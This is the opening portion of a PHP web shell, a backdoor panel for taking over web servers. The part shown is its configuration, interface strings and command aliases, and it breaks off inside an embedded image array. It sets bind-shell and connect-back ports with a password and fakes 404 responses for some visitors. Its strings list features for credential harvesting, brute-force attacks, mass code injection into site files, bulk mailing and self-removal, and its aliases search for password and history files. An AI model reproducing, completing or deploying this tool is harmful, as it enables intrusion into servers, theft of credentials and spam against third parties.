<?php
$config = array(
    "version" => "2.0.2011.1009",
    "auth" => array(
        "use_auth" => 1,
        "md5_user" => "3d02b1e37d2d1526eb965dd12ae44366",
        "md5_pass" => "3d02b1e37d2d1526eb965dd12ae44366",
        "salt" =>'3abc'),
    "default_vars" => array(
        "language" => "en",
        "email" => "yinluobing2@gmail.com",
        "default_sort" => "0a",
        "default_act" => "tools",
        "bind_port" => "31337", "bind_pass" => "P@55w0rd",
        "backcon_port" => "31337",
        "sql_host" => "localhost", "sql_user" => "root", "sql_db" => "mysql", "sql_table" => "users",
        "ftp_user" => "anonymous", "ftp_pass" => "anonymous@ftp.com",
        "downloada" => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR",
    ),
    "banned" => array(
        "agents" => array("9.1.5", "9.1.51"),
        "send_header" => 'HTTP/1.0 404 Not Found'),
    "use_buffer" => 1,
    "visual" => array(
        "width" => "1024",
        "images" => 1,
        "skins" => array("dark", "light"),
        "default_skin" => "light",
        "light" => array(
            "bodybg" => "#717678",
            "tbarbg1" => "#AAAAAA", "tbarbg2" => "#BFBFBF", "tbarbordert" => "#BBBBBB", "tbarborderb" => "#AAAAAA",
            "topbg1" => "#BBBBBB", "topbg2" => "#CCCCCC", "topborder1" => "#CDCDCD", "topcolor" => "#333333", "topshadow" => "#DDDDDD",
            "tlinkcolor" => "#333333", "tlinkshadow" => "#DDDDDD", "tlinkcolorhover" => "#000000",
            "qlbg1" => "#CCCCCC", "qlbg2" => "#AAAAAA", "qlborder" => "#DDDDDD", "qlcolor" => "#222222", "qlshadow" => "#DDDDDD", "qlcolorhover" => "#000000",
            "footerbg1" => "#CCCCCC", "footerbg2" => "#AAAAAA", "footerborder1" => "#BBBBBB", "footercolor" => "#333333", "footershadow" => "#DDDDDD",
            "tablebg" => "#F2F2F2", "tableshadow" => "#666666", "tableborder" => "#777777 ",
            "errcolor" => "#FF0000", "okcolor" => "#008200", "normalcolor" => "#333333", "dircolor" => "#333333",
            "fontfam" => "'sans-serif',sans-serif", "fontcolor" => "#525252",
            "idirborder" => "#2F7595", "idirbg1" => "#93BED7", "idirbg2" => "#63A0C7",
            "ifileborder" => "#cccccc", "ifilebg1" => "#FFFFFF", "ifilebg2" => "#DDDDDD",
            "reg_self" => "#7B7869", "reg_interesting" => "#008200", "reg_bad" => "#FF0000",
        ),
        "dark" => array(
            "bodybg" => "#717678",
            "tbarbg1" => "#141414", "tbarbg2" => "#111111", "tbarbordert" => "#111111", "tbarborderb" => "#000000",
            "topbg1" => "#111111", "topbg2" => "#222222", "topborder1" => "#222222", "topcolor" => "#CCCCCC", "topshadow" => "#000000",
            "tlinkcolor" => "#DDDDDD", "tlinkshadow" => "#000000", "tlinkcolorhover" => "#FFFFFF",
            "qlbg1" => "#222222", "qlbg2" => "#111111", "qlborder" => "#333333", "qlcolor" => "#F3F3F3", "qlshadow" => "#0A0A0A", "qlcolorhover" => "#FFFFFF",
            "footerbg1" => "#141414", "footerbg2" => "#111111", "footerborder1" => "#333333", "footercolor" => "#CCCCCC", "footershadow" => "#000000",
            "tablebg" => "#F2F2F2", "tableshadow" => "#444444", "tableborder" => "#666666",
            "errcolor" => "#FF0000", "okcolor" => "#008200", "normalcolor" => "#333333", "dircolor" => "#333333",
            "fontfam" => "'sans-serif',sans-serif", "fontcolor" => "#525252",
            "idirborder" => "#2F7595", "idirbg1" => "#93BED7", "idirbg2" => "#63A0C7",
            "ifileborder" => "#cccccc", "ifilebg1" => "#FFFFFF", "ifilebg2" => "#DDDDDD",
            "reg_self" => "#7B7869", "reg_interesting" => "#008200", "reg_bad" => "#FF0000",
        ),
    ),
    "reg_interesting" => array(
        "d" => array('backup', 'admin'),
        "f" => array('conf(.*)\.php$', '\.sql$', '\.db$', 'auth(.*)\.php$'),
    ),
    "reg_bad" => array(
        "d" => array('root'),
        "f" => array('iptables', 'ipchains'),
    ),
);

$lang["en"] = array(
    "0" => "AUTHENTICATION REQUIRED",
    "1" => "USER",
    "2" => "PASS",
    "3" => "Connect",
    "4" => "SERVER WHOIS",
    "5" => "TRACEROUTE",
    "6" => "SELF REMOVE",
    "7" => "LOGOUT",
    "8" => "SYS",
    "9" => "KERNEL",
    "10" => "DISK TOTAL/FREE",
    "11" => "WEB SOFTWARE",
    "12" => "SAFE MODE",
    "13" => "OPEN BASEDIR",
    "14" => "CURL",
    "15" => "MYSQL",
    "16" => "MSSQL",
    "17" => "ORACLE",
    "18" => "POSTGRESQL",
    "19" => "ON",
    "20" => "OFF",
    "21" => "YES",
    "22" => "NO",
    "23" => "BACK",
    "24" => "FILES",
    "25" => "SEARCH",
    "26" => "UPLOAD",
    "27" => "CMD",
    "28" => "EVAL",
    "29" => "SQL",
    "30" => "MAILERS",
    "31" => "CALC",
    "32" => "TOOLS",
    "33" => "PROC",
    "34" => "SYSINFO",
    "35" => "FILE",
    "36" => "DIR",
    "37" => "Show All",
    "38" => "Dirs",
    "39" => "Files",
    "40" => "Archives",
    "41" => "Exes",
    "42" => "PHP",
    "43" => "Html",
    "44" => "Text",
    "45" => "Images",
    "46" => "Other",
    "47" => "Show Icons",
    "48" => "Hide Icons",
    "49" => "Enable Buffer",
    "50" => "Disable Buffer",
    "51" => "Empty Buffer",
    "52" => "Show Buffer",
    "53" => "Hide Buffer",
    "54" => "Paste Copy",
    "55" => "Paste Cut",
    "56" => "Paste All",
    "57" => "Name",
    "58" => "Size",
    "59" => "Modified",
    "60" => "Owner/Group",
    "61" => "Perms",
    "62" => "Action",
    "63" => "Select All",
    "64" => "None",
    "65" => "Inverse",
    "66" => "With Selected",
    "67" => "Copy",
    "68" => "Cut",
    "69" => "Unset Copy",
    "70" => "Unset Cut",
    "71" => "Unset All",
    "72" => "Delete",
    "73" => "Rename",
    "74" => "Functions",
    "75" => "Edit",
    "76" => "Download",
    "77" => "Confirm",
    "78" => "VIEWING FILE:",
    "79" => "Text",
    "80" => "Code",
    "81" => "Html",
    "82" => "Html-NoJS",
    "83" => "Execute",
    "84" => "Session",
    "85" => "Sdb",
    "86" => "INI",
    "87" => "Image",
    "88" => "Hexdump",
    "89" => "Browser Default",
    "90" => "STRING CONVERSIONS",
    "91" => "FUNCTION",
    "92" => "Submit",
    "93" => "CHANGE FILE'S PERMISSIONS:",
    "94" => "Owner",
    "95" => "Group",
    "96" => "World",
    "97" => "Read",
    "98" => "Write",
    "99" => "Execute",
    "100" => "Chmod",
    "101" => "OR ENTER VALUE",
    "102" => "OUTPUT",
    "103" => "CHANGE FILE'S TIMESTAMP",
    "104" => "COPY FROM FILE/DIR",
    "105" => "SET TIME MANUALLY",
    "106" => "Month",
    "107" => "Day",
    "108" => "Year",
    "109" => "Hour",
    "110" => "Min",
    "111" => "Sec",
    "112" => "Change",
    "113" => "Timestamp changed to [%1%]",
    "114" => "Failed to change timestamp",
    "115" => "REPLACE",
    "116" => "WITH",
    "117" => "Replace",
    "118" => "Reset",
    "119" => "Save",
    "120" => "PROGRAM LINE",
    "121" => "Full Hexdump",
    "122" => "Hexdump Preview",
    "123" => "CHANGE DIR'S PERMISSIONS:",
    "124" => "CHANGE DIR'S TIMESTAMP:",
    "125" => "BYPASS RESTRICTIONS - LIST DIR",
    "126" => "DIR TO LIST",
    "127" => "List Dir",
    "128" => "BYPASS RESTRICTIONS - READ FILE",
    "129" => "FILE TO READ",
    "130" => "Read File",
    "131" => "BYPASS RESTRICTIONS - READ FILE VIA SQL",
    "132" => "USERNAME",
    "133" => "PASSWORD",
    "134" => "PORT",
    "135" => "DATABASE",
    "136" => "[-] ERROR! Can't select database",
    "137" => "[-] ERROR! Can't connect to [%1%] server",
    "138" => "BYPASS RESTRICTIONS - WRITE FILE",
    "139" => "FILE TO WRITE",
    "140" => "FILE CONTENT",
    "141" => "Write File",
    "142" => "SEARCH FOR FILES AND DIRS USING PHP",
    "143" => "NAME/FIND/RECURSIVE",
    "144" => "Files",
    "145" => "Dirs",
    "146" => "Both",
    "147" => "Search",
    "148" => "use regexp on name",
    "149" => "SEARCH IN DIR",
    "150" => "FIND TEXT IN FILE",
    "151" => "use regexp on text",
    "152" => "whole words only",
    "153" => "case sensitive",
    "154" => "files not containing the text",
    "155" => "SEARCH TEXT IN FILES USING FIND",
    "156" => "TEXT TO FIND",
    "157" => "FIND IN FILES",
    "158" => "DEFINED/SEARCH IN",
    "159" => "show in file manager",
    "160" => "NOTHING FOUND",
    "161" => "UPLOAD LOCAL FILE",
    "162" => "LOCAL FILE",
    "163" => "OPTIONAL RENAME",
    "164" => "UPLOAD PATH",
    "165" => "FILE LOCATION",
    "166" => "MULTIPLE FILES",
    "167" => "UPLOAD FILE FROM REMOTE URL",
    "168" => "UPLOAD MULTIPLE FILES",
    "169" => "Form",
    "170" => "Upload",
    "171" => "Invalid file location: [%1%]",
    "172" => "Error uploading [%1%] (Can't move [%2%] to [%3%]",
    "173" => "File [%1%] uploaded to [%2%]",
    "174" => "Can't download file!",
    "175" => "Can't write to [%1%]",
    "176" => "File uploaded to [%1%]",
    "177" => "SEND FILE TO E-MAIL",
    "178" => "SEND TO",
    "179" => "Send",
    "180" => "COMMAND",
    "181" => "DEFINED",
    "182" => "EXECUTE PHP CODE",
    "183" => "Execute PHP Code",
    "184" => "Display Result in Textarea",
    "185" => "FTP MANAGER",
    "186" => "HOST:PORT",
    "187" => "USER",
    "188" => "PASS",
    "189" => "Connect",
    "190" => "Passive",
    "191" => "Can't connect",
    "192" => "PHP-SHELL",
    "193" => "FTP",
    "194" => "NEW DIR",
    "195" => "Create",
    "196" => "Disconnect",
    "197" => "Upload",
    "198" => "Download",
    "199" => "Delete",
    "200" => "DOWNLOAD FILE FROM REMOTE FTP",
    "201" => "UPLOAD FILE TO REMOTE FTP",
    "202" => "HOST:PORT",
    "203" => "USER:PASS",
    "204" => "FILE ON FTP",
    "205" => "LOCAL FILE",
    "206" => "Upload File",
    "207" => "Download File",
    "208" => "File uploaded.",
    "209" => "Can't upload file.",
    "210" => "File downloaded.",
    "211" => "Can't download file.",
    "212" => "PHP SIMPLE MAILER",
    "213" => "PHP CSV MAILER",
    "214" => "FROM NAME",
    "215" => "FROM E-MAIL",
    "216" => "E-MAIL SUBJECT",
    "217" => "REPLACE",
    "218" => "WITH",
    "219" => "IN",
    "220" => "E-MAIL COL",
    "221" => "COL PREFIX",
    "222" => "REPLACE IN",
    "223" => "Select Value",
    "224" => "From Name",
    "225" => "From E-mail",
    "226" => "Receiver's E-mail",
    "227" => "Receiver's E-mail - hash",
    "228" => "Subject",
    "229" => "Message",
    "230" => "Subject and Message",
    "231" => "Random \"FROM E-MAIL\" usernames",
    "232" => "Random Message-ID domains",
    "233" => "Send E-mails",
    "234" => "Preview (Don't send)",
    "235" => "Show replaced values",
    "236" => "INCOMPLETE DATA",
    "237" => "NO",
    "238" => "RECEIVER",
    "239" => "SENDER",
    "240" => "MESSAGE-ID",
    "241" => "STATUS",
    "242" => "REPLACING",
    "243" => "Success",
    "244" => "Failed",
    "245" => "Test",
    "246" => "HASH TYPE",
    "247" => "ENTER HASH",
    "248" => "Submit",
    "249" => "Calculate",
    "250" => "Clear Input",
    "251" => "POSSIBLE",
    "252" => "Link",
    "253" => "IP ADDRESS ENCODER",
    "254" => "ENTER IP",
    "255" => "LONG IP",
    "256" => "HEX IP",
    "257" => "OCTAL IP",
    "258" => "SELECT HASH",
    "259" => "ENTER INPUT",
    "260" => "All",
    "261" => "HASH OUTPUT",
    "262" => "STRING CONVERSIONS OUTPUT",
    "263" => "Clear Output",
    "264" => "Send Output to Input",
    "265" => "BIND SHELL",
    "266" => "CONNECT BACK",
    "267" => "PASS:PORT:SRC",
    "268" => "Bind",
    "269" => "Found [%1%] of our backdoor tools in tempdir. Consider deleting tools after using them. ",
    "270" => "Delete Now",
    "271" => "Can't write sources!",
    "272" => "Unknown file!",
    "273" => "Executed. Can't connect to [%1%]!",
    "274" => "OK! Connect to [%1%]:[%2%]!",
    "275" => "Port [%1%] already in use!",
    "276" => "OK! The script is now connecting to [%1%]:[%2%]",
    "277" => "PORTSCAN",
    "278" => "HOST:PORT RANGE",
    "279" => "Scan",
    "280" => "VALID RANGE 0-65535",
    "281" => "PHP-SHELL HUNTER",
    "282" => "ACTION:RECURSIVE",
    "283" => "FUNCTION:START PATH",
    "284" => "View known shells only",
    "285" => "View known shells + possible",
    "286" => "Overwrite known shells with RC-Shell",
    "287" => "Overwrite all with RC-Shell",
    "288" => "PHP-SHELL RESULTS",
    "289" => "PORTSCAN RESULT",
    "290" => "Owned",
    "291" => "Can't own it",
    "292" => "FILE NAME",
    "293" => "SHELL TYPE OR VERSION",
    "294" => "EXTERNAL LINK",
    "295" => "FILE ACTIONS / OVERWRITE",
    "296" => "View in Browser",
    "297" => "RC-OVERWRITE",
    "298" => "CPANEL / PASSWORD FINDER",
    "299" => "HOST:USER:SERVICE",
    "300" => "FILES:METHOD:RECURSIVE",
    "301" => "FUNCTION:DEFINED PATH",
    "302" => "SEND LOG TO",
    "303" => "Don't login (create passfile)",
    "304" => "user + DEFINED PATH",
    "305" => "user + DOCUMENT ROOT",
    "306" => "/etc/passwd + USER HOMES",
    "307" => "Find Passwords",
    "308" => "CPANEL / PASSWORD FINDER RESULTS",
    "309" => "MASS CODE INJECTOR",
    "310" => "FILES:POS:RECURSIVE",
    "311" => "FUNCTION:START IN PATH",
    "312" => "CODE TO INJECT",
    "313" => "Inject Files",
    "314" => "CODE INJECTED IN FILES BELOW",
    "315" => "FIND SQL CREDENTIALS",
    "316" => "USER NAME:TYPE",
    "317" => "PASS NAME:TYPE",
    "318" => "DB NAME:TYPE",
    "319" => "HOST NAME:TYPE",
    "320" => "*SOFTWARE:PASSWORD",
    "321" => "FILES:WHERE:RECURSIVE",
    "322" => "FUNCTION:DEFINED PATH",
    "323" => "Find Credentials",
    "324" => "MySQL Test",
    "325" => "DEFINED PATH",
    "326" => "DOCUMENT ROOT",
    "327" => "USER HOMES",
    "328" => "required",
    "329" => "optional",
    "330" => "SQL CREDENTIALS",
    "331" => "HOST",
    "332" => "USER",
    "333" => "PASS",
    "334" => "DATABASE",
    "335" => "ACTION",
    "336" => "MySQL Connect",
    "337" => "BRUTEFORCE / DICTIONARY ATTACK",
    "338" => "HOST:PORT:SERVICE",
    "339" => "USERNAME:DATABASE",
    "340" => "DICTIONARY",
    "341" => "TEST METHOD",
    "342" => "ALSO TEST",
    "343" => "username and dictionary",
    "344" => "/etc/passwd (user:user)",
    "345" => "/etc/passwd and dictionary",
    "346" => "Start Bruteforce",
    "347" => "[%1%] BRUTEFORCE RESULT",
    "348" => "SYSTEM PROCESSES",
    "349" => "SENDING SIGNAL [%1%] TO #[%2%].. ",
    "350" => "KILLED",
    "351" => "CAN'T KILL IT",
    "352" => "Databases",
    "353" => "Query",
    "354" => "Extract E-mails",
    "355" => "Server Status",
    "356" => "Server Variables",
    "357" => "Processes",
    "358" => "Disconnect",
    "359" => "DATABASES",
    "360" => "Database Name",
    "361" => "Size",
    "362" => "Tables",
    "363" => "Database Actions",
    "364" => "DATABASE",
    "365" => "TABLE",
    "366" => "DATABASE [%1%]",
    "367" => "Databases ([%1%])",
    "368" => "Table Name",
    "369" => "Table Actions",
    "370" => "SQL QUERY",
    "371" => "Submit Query",
    "372" => "EXTRACT E-MAILS",
    "373" => "SEARCH TABLES<br>COMMA (,) SEPARATED<br>LEAVE EMPTY FOR ALL",
    "374" => "FILE NAME",
    "375" => "SAVE E-MAILS TO FILE",
    "376" => "DOWNLOAD RESULTS",
    "377" => "Extract E-mails",
    "378" => "SERVER STATUS",
    "379" => "SERVER VARIABLES",
    "380" => "Name",
    "381" => "Value",
    "382" => "PROCESSES",
    "383" => "ID",
    "384" => "USER",
    "385" => "HOST",
    "386" => "DATABASE",
    "387" => "COMMAND",
    "388" => "TIME",
    "389" => "STATE",
    "390" => "INFO",
    "391" => "ACTION",
    "392" => "KILL",
    "393" => "PROCESS #[%1%] KILLED",
    "394" => "QUERY RESULT",
    "395" => "BROWSING TABLE [%1%] ( [%2%] cols and [%3%] rows )",
    "396" => "Previous",
    "397" => "Page",
    "398" => "Go",
    "399" => "Next",
    "400" => "INSERT INTO TABLE [%1%]",
    "401" => "Field",
    "402" => "Type",
    "403" => "Function",
    "404" => "Value",
    "405" => "Insert as new row",
    "406" => "or",
    "407" => "Save",
    "408" => "Confirm",
    "409" => "TOTAL DATABASES [%1%]",
    "410" => "QUICK SQL TABLE DUMP",
    "411" => "SQL TYPE",
    "412" => "HOST:PORT",
    "413" => "USER:PASS",
    "414" => "DB.TABLE",
    "415" => "FILE NAME",
    "416" => "DOWNLOAD RESULTS",
    "417" => "SAVE DUMP TO FILE",
    "418" => "Dump",
    "419" => "Can't connect to SQL server",
    "420" => "QUICK SQL QUERY",
    "421" => "DB",
    "422" => "Query",
    "423" => "QUERY #[%1%] : [%2%]",
    "424" => "NONE",
    "425" => "Chdir",
    "426" => "Total: [%1%]",
    "427" => "Success: [%1%]",
    "428" => "Failed: [%1%]",
    "429" => "Used: [%1%]",
    "430" => "Not Available",
    "431" => "The following e-mails were not sent",
    "432" => "HASH CALCULATOR",
    "433" => "STRING CONVERSIONS",
    "434" => "HOST:PORT:SRC",
    "435" => "Connect",
    "436" => "Find Shells",
    "437" => "DO YOU REALLY WANT TO DROP DATABASE \"[%1%]\" ? ",
    "438" => "DO YOU REALLY WANT TO DROP TABLE \"[%1%]\" ? ",
    "439" => "DO YOU REALLY WANT TO EMPTY TABLE \"[%1%]\" ? ",
    "440" => "SQL DUMP",
    "441" => "DATABASE",
    "442" => "DUMP TABLES<br>COMMA (,) SEPARATED<br>LEAVE EMPTY FOR ALL",
    "443" => "FILE NAME",
    "444" => "SAVE DUMP TO FILE",
    "445" => "DOWNLOAD RESULTS",
    "446" => "Dump",
    "447" => "Can't select database",
    "448" => "Nothing to dump",
    "449" => "Dumped to [%1%]",
    "450" => "Can't write to file.",
    "451" => "SQL MANAGER",
    "452" => "HOST:PORT",
    "453" => "USER",
    "454" => "PASS",
    "455" => "DB",
    "456" => "TYPE",
    "457" => "Connect",
    "458" => "Can't create dump",
    "459" => "Dumped",
    "460" => "SELF REMOVE",
    "461" => "DO YOU REALLY WANT TO DELETE ME? ",
    "462" => "GOOD BYE",
    "463" => "Can't delete [%1%]",
    "464" => "CAN'T LIST [%1%]",
    "465" => "Free: [%1%]",
    "466" => "FILE [%1%] DOESNT EXIST.",
    "467" => "YOU ARE TRYING TO OPEN A DIRECTORY AS A FILE ([%1%])",
    "468" => "TARGET ALREADY EXISTS (DIRECTORY [%1%])",
    "469" => "FILE NOT SPECIFIED",
    "470" => "Return",
    "471" => "Your browser doesnt support iframes.",
    "472" => " (CWD SPECIFIED AS A FILE)",
    "473" => "RENAME [%1%]",
    "474" => "RENAMED TO [%1%]",
    "475" => "CANNOT RENAME [%1%]",
    "476" => "EXTRACTED ZIP ARCHIVE [%1%]",
    "477" => "CANNOT EXTRACT [%1%]",
    "478" => "Extract [%1%]",
    "479" => "GENERAL INFORMATION",
    "480" => "PHP INFORMATION",
    "481" => "OTHER USEFULL STUFF",
    "482" => "Interesting files",
    "483" => "Interesting configs",
    "484" => "Interesting bins",
    "485" => "Scripting languages",
    "486" => "PAGE GENERATED IN [%1%] SECONDS",
    "undefined" => "?",
);

$winaliases = array(
    '' => 'dir',
    '- show open ports' => 'netstat -nat',
    '- running programs' => 'tasklist -v',
    '- running services' => 'net start',
    '- show users' => 'net user',
    '- show computers' => 'net view',
    '- arp table' => 'arp -a',
    '- ip config' => 'ipconfig /all',
    '- mac address' => 'getmac',
    '- systeminfo' => 'systeminfo',
    '- file associations' => 'assoc',
);

$nixaliases = array(
    '' => 'ls -la',
    'console downloaders' => 'which wget GET ftp curl w3m lynx',
    'cpu info' => 'cat /proc/version /proc/cpuinfo',
    'gcc compiler' => 'locate gcc',
    'logged in users' => 'w',
    'active users (from lastlog)' => 'lastlog|grep -v \'\\*\\*\'',
    'last logins (last -a)' => 'last -a',
    'users without password' => 'cut -d: -f1,2,3 /etc/passwd | grep ::',
    'list file attributes' => 'lsattr -va',
    'show open ports (from netstat)' => 'netstat -nat | grep -i listen',
    'active connections (from lsof)' => 'lsof -i',
);

$findaliases = array(
    'find suid files' => 'find %path% -type f -perm -04000 -ls 2>/dev/null',
    'find sgid files' => 'find %path% -type f -perm -02000 -ls 2>/dev/null',
    'find writable dirs' => 'find %path% -perm -2 -type d -ls 2>/dev/null',
    'find writable files' => 'find %path% -perm -2 -type f -ls 2>/dev/null',
    'find writable links' => 'find %path% -perm -2 -type l -ls 2>/dev/null',
    'find writable dirs/files/links' => 'find %path% -perm -2 -ls 2>/dev/null',
    'find config* files' => 'find %path% -type f -name \'config*\'',
    'find config.php files' => 'find %path% -type f -name config.php',
    'find config.inc.php files' => 'find %path% -type f -name config.inc.php',
    'find service.pwd files' => 'find %path% -type f -name service.pwd',
    'find .htpasswd files' => 'find %path% -type f -name .htpasswd',
    'find .bash history' => 'find %path% -type f -name .bash_history',
    'find .mysql history' => 'find %path% -type f -name .mysql_history',
    'find fetchmailrc' => 'find %path% -type f -name .fetchmailrc',
);

$filealiases = array(
    'html' => array('html', 'htm', 'shtml'),
    'text' => array('html', 'htm', 'shtml', 'css', 'js', 'txt', 'conf', 'bat', 'bak', 'doc', 'log', 'sfc', 'cfg', 'readme', 'todo', 'changelog', 'makefile', 'cmake', 'copying', 'authors', 'motd', 'news', 'install', 'about', 'htaccess'),
    'exe' => array('sh', 'bat', 'cmd', 'exe', 'pl', 'py'),
    'ini' => array('ini', 'inf'),
    'code' => array('php', 'phtml', 'php3', 'php4', 'php5', 'pl', 'cgi', 'c', 'cc', 'cpp', 'h', 'hpp', 'icl', 'ipp'),
    'img' => array('gif', 'png', 'jpeg', 'jfif', 'jpg', 'jpe', 'bmp', 'ico', 'tif', 'tiff'),
    'sdb' => array('sdb'),
    'sess' => array('sess'),
    'download' => array('sql', '3g2', '3ga', '3gp', '3gpp', '669', '7z', 'aac', 'ac3', 'ace', 'aif', 'aifc', 'aiff', 'amr', 'ape', 'arj', 'asf', 'asx', 'au', 'avi', 'awb', 'axa', 'axv', 'bdm', 'bdmv', 'bz', 'bz2', 'cab', 'clpi', 'com', 'cpi', 'doc', 'dot', 'divx', 'dmg', 'dv', 'exe', 'fla', 'flac', 'flc', 'fli', 'flv', 'gsm', 'gz', 'iso', 'it', 'kar', 'lha', 'lnk', 'lzh', 'm15', 'm2t', 'm2ts', 'm3u', 'm3u8', 'm4a', 'm4b', 'm4v', 'med', 'mid', 'midi', 'minipsf', 'mka', 'mkv', 'mng', 'mo3', 'mod', 'moov', 'mov', 'movie', 'mp+', 'mp2', 'mp3', 'mp4', 'mpc', 'mpe', 'mpeg', 'mpg', 'mpga', 'mpl', 'mpls', 'mpp', 'mtm', 'mts', 'nrg', 'nsv', 'oga', 'ogg', 'ogm', 'ogv', 'pbk', 'pif', 'pla', 'pls', 'psf', 'psflib', 'psid', 'qt', 'qtvr', 'r00', 'ra', 'rar', 'rax', 'rv', 'rvx', 's3m', 'sid', 'snd', 'spx', 'src', 'stm', 'swf', 'tar', 'tbz', 'tbz2', 'tgz', 'ts', 'tta', 'ult', 'uni', 'uu', 'uuf', 'viv', 'vivo', 'vlc', 'vob', 'voc', 'wav', 'wax', 'wma', 'wmv', 'wmx', 'wri', 'wv', 'xla', 'xlc', 'xld', 'xlsb', 'xll', 'xlm', 'xls', 'xlt', 'xlsm', 'xlw', 'xltm', 'wvc', 'wvp', 'wvx', 'xi', 'xm', 'xmf', 'xxe', 'zip'),
);

$execaliases = array(
    'sh %f%' => array('sh'),
    'perl %f%' => array('pl', 'cgi'),
    'python %f%' => array('py'),
    'php %f%' => array('php', 'php3', 'php4', 'php5'),
);

$getaliases = array(
    'wget' => '[%1%] [%2%] -O [%3%]',
    'fetch' => '[%1%] -p [%2%] -o [%3%]',
    'lynx' => '[%1%] -source [%2%] > [%3%]',
    'links' => '[%1%] -source [%2%] > [%3%]',
    'GET' => '[%1%] [%2%] > [%3%]',
    'curl' => '[%1%] [%2%] -o [%3%]',
);

$index = array(
    "xls" => array('xla', 'xlc', 'xld', 'xlsb', 'xll', 'xlm', 'xls', 'xlt', 'xlsm', 'xlw', 'xltm'),
    "pl" => array("pl", "cgi"),
    "diz" => array("diz", "inf"),
    "h" => array("h", "hpp"),
    "iso" => array("iso", "nrg", "dmg"),
    "tar" => array("tar", "r00", "ace", "arj", "bz", "bz2", "tbz", "tbz2", "tgz", "uu", "xxe", "zip", "cab", "gz", "lha", "lzh", "pbk", "rar", "uuf", "7z"),
    "php" => array("php", "php3", "php4", "php5", "phtml", "shtml"),
    "jpg" => array("jpg", "gif", "png", "jpeg", "jfif", "jpe", "bmp", "ico", "tif", "tiff"),
    "html" => array("html", "htm", "asp", "xhtml"),
    "avi" => array('ogm', 'mpeg', 'bdmv', 'qtvr', 'ogv', 'cpi', 'm2ts', 'movie', 'asf', 'mpls', 'mkv', 'avi', 'rvx', 'qt', 'mp2', 'mp4', 'divx', 'mng', 'axv', 'rv', 'mov', 'moov', 'mpe', 'mpl', 'mpg', 'ts', 'nsv', '3g2', '3ga', 'mts', 'm2t', '3gp', '3gpp', 'vivo', 'm4v', 'flc', 'bdm', 'fli', 'viv', 'flv', 'wmv', 'clpi', 'vob', 'dv', 'ogg'),
    "doc" => array("doc", "dot", "wri"),
    "txt" => array("txt", "log", "conf", "cfg", "vbs", "ini"),
    "js" => array("js"),
    "cmd" => array("cmd", "bat", "pif", "exe", "sh", "makefile"),
    "wri" => array("wri", "rtf"),
    "swf" => array("swf", "fla"),
    "mp3" => array('amr', 'm3u8', 'med', 'spx', 'spx', 'kar', 'mpga', 'pla', 'it', 'ape', 'tta', 'pls', 'stm', 'mid', 's3m', 'asx', 'mka', 'awb', 'psf', 'aifc', 'mo3', 'aiff', 'mp+', 'axa', 'mp2', 'mp3', 'ra', 'mod', 'wav', 'wax', 'mpc', 'midi', 'mpp', 'm15', 'psid', 'wv', 'mtm', 'xi', 'xm', 'm3u', 'm4b', 'm4a', 'aac', 'ac3', 'xmf', 'rax', 'minipsf', 'wma', 'wmx', 'vlc', 'ult', '669', 'sid', 'voc', 'gsm', 'au', 'uni', 'flac', 'aif', 'snd', 'psflib', 'wvc', 'oga', 'wvp', 'ogg', 'wvx'),
    "cpp" => array("cpp", "c", "cc", "cxx"),
    "css" => array('css'),
    "htaccess" => array("htaccess", "htpasswd", "ht", "hta"),
);

$images = array(
    "ok" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAADoSURBVDiNrZOxboNADIY/08CAunTIQBakSLRbH6Qv0XfrQ/QBmLM1iqIMERnaDqxcJsBdOHQhXJOI/JJ1Z8v32z7boqpMQTDpNTDz2OfA08BmgO8zT1Udkwz4BUoreZ6/qqoMfX0ZAByA0CpJktSXSlgAj45+dAk6ZN1ZAT8A4nThWUQ+Hec94LZoCUhX9huwG2YA8DWWZof1pRJs2jfhrgSVqq6sEobhS13XD1Y3xmziOO597UU8o5yJyDvQExRF8ZGm6ZbTj/XPQRAEx7Zte4IoikYj+QiqpmlKTnfFDKP/V8LVmLyNf9lXY6ltlYsrAAAAAElFTkSuQmCC",
    "cancel" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAHlSURBVDiNpZPPa9NwGMafLkn3HVkDapMsAxEKbbdBmafSi3eZjkXBH8yTMGGwQ4/7CwaDnXqdB0/dFmWhhQqyywZeJJc5ehiYMZAeSlqt0EUy2qavB1sJkSLSF97Lw/t8+PI8fCNEhHFmYiz3CIACIAFADGjiQFP+BZjZy2X17SlWvjCM9MAoXhhGenuKlfdyWR3ATNAQCWSgGPdyeuPzWUHleVbzfXvl9ZvnAFB+9fLgNsclnV7vWrm7mH/28VMJQCMMSBTnU6bWbi1yEeDK7+Oy07MBIBHlkzFuAj4Bdenm2YvzL48BXIYBYsepr1T1+/luw8kCQLvnAwAkngMACIpqZUofClFVKwP4GQYAgNRxnIf20wf5zrffkOFE46qVfPu+EFXVCoD2qBB959Sya543zRiP4NY8b9o5tWwA/qgWxHrFTB9vrBXlvrcwyQQEV+57C8cba8V6xRy281cLiXeZO6X5WDRzgwkAAO6WbAGA/72ZBYAf112cX3WqT6pf9WGIwRe4S1s7+1o85jImQJzVLHn3sCDvHhbEWc1iTIAWj7lLWzv7ANw/LiIK7lz3yNx015dPqNVcJSKJiCRqNVfd9eWT7pG5SURzQU8YACJKEdGjgXmoSQMtFb4P1/jfM/Zv/AXVzv8RqSjGwgAAAABJRU5ErkJggg==",
